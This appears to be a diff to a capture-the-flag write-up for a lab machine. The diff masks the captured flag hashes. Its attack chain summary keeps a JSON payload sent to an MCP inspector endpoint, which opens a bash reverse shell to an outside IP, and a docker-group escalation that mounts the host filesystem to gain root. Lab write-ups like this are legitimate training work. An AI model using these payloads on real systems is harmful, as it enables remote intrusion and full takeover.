@@ -176,7 +176,7 @@ cat /home/ben/user.txt
 ```
 
 ```
-656bbb9a07380a2d5cc44557d09e7306
+**6bbb9a07380a2d5cc44557d09e73**
 ```
 
 ✅ **User flag captured.**
@@ -303,11 +303,8 @@ cat /mnt/root/root.txt
 ```
 
 ```
-bff6765848d93de397b0095bebfbf719
+**f6765848d93de397b0095bebfbf7**
 ```
-
-✅ **Root flag captured. Machine owned.**
-
 ---
 
 ## 8. Attack Chain Summary
@@ -328,7 +325,7 @@ https://mcp.kobold.htb → MCPJam Inspector
 POST /api/mcp/connect
 {"serverId":"pwn","serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.124/4444 0>&1"]}}
 → Reverse shell as ben
-→ user.txt: 656bbb9a07380a2d5cc44557d09e7306
+→ user.txt: **6bbb9a07380a2d5cc44557d09e73**
         |
         v
 [Enumeration]
@@ -340,7 +337,7 @@ docker:x:111 in /etc/group — newgrp docker works without password
 newgrp docker → gid=111(docker) activated
 docker run -it --rm --user root --entrypoint /bin/sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
 → Root in container, host / mounted at /mnt
-→ root.txt: bff6765848d93de397b0095bebfbf719
+→ root.txt: **f6765848d93de397b0095bebfbf7**
 ```
 
 ---
